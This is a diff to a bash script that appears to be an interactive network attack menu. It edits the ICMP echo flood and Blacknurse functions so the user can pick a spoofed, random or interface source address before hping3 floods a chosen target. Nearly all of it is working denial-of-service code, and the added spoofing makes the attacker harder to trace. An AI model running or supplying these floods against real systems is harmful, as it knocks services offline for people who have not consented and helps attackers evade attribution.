@@ -329,25 +329,56 @@ icmpflood()
 		echo "Enter target IP/hostname:"
 #need a target IP/hostname
 		read -i $TARGET -e TARGET
-		echo "Launching ICMP Echo Flood against $TARGET" && sleep 1
+#What source address to use? Manually defined, or random, or outgoing interface IP?
+		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
+	read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+		echo "Starting ICMP echo Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 -1 --flood --spoof $SOURCE $TARGET
+	elif [ "$SOURCE" = "r" ]; then
+		echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 -1 --flood --rand-source $TARGET
+	elif [ "$SOURCE" = "i" ]; then
+		echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
 		sudo hping3 -1 --flood $TARGET
+	else echo "Not a valid option!  Using interface IP"
+		echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 -1 --flood $TARGET
+	fi
 }
 ##END ICMPFLOOD##
-#################
+#################	
 
 ####################
 ##START BLACKNURSE##
 blacknurse()
 {		
-		echo "Preparing to launch ICMP Blacknurse attack using hping3"
+		echo "Preparing to launch ICMP Blacknurse Flood using hping3"
 		echo "Enter target IP/hostname:"
 #need a target IP/hostname
 		read -i $TARGET -e TARGET
-		echo "Launching ICMP Blacknurse against $TARGET" && sleep 1
+#What source address to use? Manually defined, or random, or outgoing interface IP?
+		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
+	read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 -1 -C 3 -K 3 --flood --spoof $SOURCE $TARGET
+	elif [ "$SOURCE" = "r" ]; then
+		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 -1 -C 3 -K 3 --flood --rand-source $TARGET
+	elif [ "$SOURCE" = "i" ]; then
+		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
 		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
+	else echo "Not a valid option!  Using interface IP"
+		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
+	fi
 }
 ##END BLACKNURSE##
 ##################
+
 
 #####################
 ##START TCPSYNFLOOD##
